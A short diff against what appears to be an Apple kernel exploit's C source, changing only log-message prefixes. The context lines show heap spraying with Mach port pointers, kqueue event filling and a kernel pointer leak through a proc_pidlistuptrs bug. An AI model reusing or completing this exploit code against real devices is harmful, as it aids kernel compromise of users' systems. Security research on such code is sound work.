@@ -68,7 +68,7 @@ static void fill_events(int n_events) {
                         KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
     
     if (err != 0) {
-      LOG(" [-] failed to enqueue user event\n");
+      LOG("failed to enqueue user event\n");
       exit(EXIT_FAILURE);
     }
     
@@ -85,7 +85,7 @@ static void prepare_kqueue() {
     return;
   }
   fill_events(10000);
-  LOG(" [+] prepared kqueue\n");
+  LOG("prepared kqueue\n");
   kqueues_allocated = 1;
 }
 
@@ -123,7 +123,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
   kern_return_t err;
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
   if (err != KERN_SUCCESS) {
-    LOG(" [-] failed to allocate port\n");
+    LOG("failed to allocate port\n");
     exit(EXIT_FAILURE);
   }
   
@@ -158,7 +158,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
                  MACH_PORT_NULL);
   
   if (err != KERN_SUCCESS) {
-    LOG(" [-] failed to send message: %s\n", mach_error_string(err));
+    LOG("failed to send message: %s\n", mach_error_string(err));
     exit(EXIT_FAILURE);
   }
   
@@ -198,7 +198,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) 
   }
   
   if (valid_guesses == 0) {
-    LOG(" [-] couldn't leak any kernel pointers\n");
+    LOG("couldn't leak any kernel pointers\n");
     exit(EXIT_FAILURE);
   }
   
